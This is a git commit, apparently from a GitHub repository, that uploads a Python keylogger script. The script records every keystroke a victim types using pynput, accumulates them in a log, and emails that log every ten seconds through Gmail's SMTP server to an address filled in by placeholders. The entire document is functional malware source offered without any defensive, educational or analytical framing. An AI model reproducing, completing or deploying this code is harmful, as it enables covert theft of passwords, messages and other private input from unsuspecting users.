0824065194e602b48d7b696b53d75a0c263cbc3b
Aziz <88969466+azizvangogh@users.noreply.github.com>
2022-06-18 18:07:25 +0300

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,40 @@
+import pynput.keyboard
+import smtplib
+import threading
+
+log = ""
+
+def callback_function(key):
+    global log
+    try:
+        #log = log + key.char.encode('utf-8')
+        log = log + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + str(key)
+    except:
+        pass
+
+    print(log)
+
+def send_email(email,password,message):
+    email_server = smtplib.SMTP("smtp.gmail.com",587)
+    email_server.starttls()
+    email_server.login(email,password)
+    email_server.sendmail(email,email,message)
+    email_server.quit()
+
+
+def thread_function():
+    global log
+    send_email("YOUR_EMAIL_ADRESS", "YOUR_PASSWORD", log.encode('utf-8'))
+    log = ""
+    timer_object = threading.Timer(10,thread_function)
+    timer_object.start()
+
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
+with keylogger_listener:
+    thread_function()
+    keylogger_listener.join()
